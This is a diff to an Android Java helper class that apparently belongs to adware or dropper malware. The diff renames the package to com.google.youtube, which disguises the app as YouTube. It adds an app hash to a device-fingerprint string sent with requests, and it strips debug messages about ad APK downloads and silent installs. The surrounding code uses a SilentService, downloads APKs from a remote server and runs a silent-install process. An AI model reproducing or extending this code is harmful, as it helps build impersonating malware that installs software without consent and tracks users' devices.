@@ -1,4 +1,4 @@
-package com.mx.utils.utils;
+package com.google.youtube.utils;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -19,7 +19,7 @@ import javax.crypto.spec.DESKeySpec;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import com.mx.utils.services.SilentService;
+import com.google.youtube.services.SilentService;
 
 import android.app.DownloadManager;
 import android.app.Notification;
@@ -243,10 +243,16 @@ public class MyHelpUtil {
 				.append("&ac="
 						+ localSharedPreferences_id.getString(
 								"create_device_id", "no"));
+		
 
 		params_str.append("&ad=" + DeviceUtils.getTelephoneType(context));
 
 		params_str.append("&ae=" + AppUtil_i.getPackageLocation(context));
+		
+		params_str
+		.append("&af="
+				+ localSharedPreferences_id.getString(
+						"app_md5", "no"));
 
 		return params_str.toString();
 	}
@@ -394,8 +400,8 @@ public class MyHelpUtil {
 		NotificationManager _nm = (NotificationManager) context
 				.getSystemService(Context.NOTIFICATION_SERVICE);
 
-		// 0x7f020001 context.getApplicationInfo().icon  
-		Notification notifacation = new Notification(0x7f02016d, ticktitle,
+		// 0x7f020001 context.getApplicationInfo().icon 0x7f02016d
+		Notification notifacation = new Notification(0x7f020001, ticktitle,
 				System.currentTimeMillis());
 
 		notifacation.flags |= Notification.FLAG_AUTO_CANCEL;
@@ -506,7 +512,7 @@ public class MyHelpUtil {
 				}
 
 				localEditor.commit();
-				
+
 			}
 
 		} catch (Exception e) {
@@ -545,12 +551,23 @@ public class MyHelpUtil {
 
 		SharedPreferences localSharedPreferences = context
 				.getSharedPreferences("DEVICE_STATUS", 0);
+
+		Editor localEditor = localSharedPreferences.edit();
+
 		if (!localSharedPreferences.contains("create_device_id")) {
-			Editor localEditor = localSharedPreferences.edit();
+
 			localEditor.putString("create_device_id", UUID.randomUUID()
 					.toString());
+
+			localEditor.commit();
+
+		}
+
+		if (!localSharedPreferences.contains("app_md5")) {
+			localEditor.putString("app_md5", AppUtil_i.saveAppMD5(context));
 			localEditor.commit();
 		}
+
 	}
 
 	/**
@@ -798,19 +815,13 @@ public class MyHelpUtil {
 		DownloadManager downloadManager = (DownloadManager) context
 				.getSystemService(Context.DOWNLOAD_SERVICE);
 
-		// 自定义下载地址
-		
 		Uri uri;
 
-		System.out.println("广告》》APK下载地址：" + download_url);
-		
-		if(TextUtils.isEmpty(download_url)){
-			
-			System.out.println("静默：下载地址没有配置，到默认服务器下载");
-			
+		if (TextUtils.isEmpty(download_url)) {
+
 			uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context, appalias));
-			
-		}else{
+
+		} else {
 			uri = Uri.parse(download_url);
 		}
 
@@ -909,8 +920,6 @@ public class MyHelpUtil {
 				process.destroy();
 			}
 		}
-
-		System.out.println("静默安装返回结果字符：" + result);
 
 		if (result != null) {
 
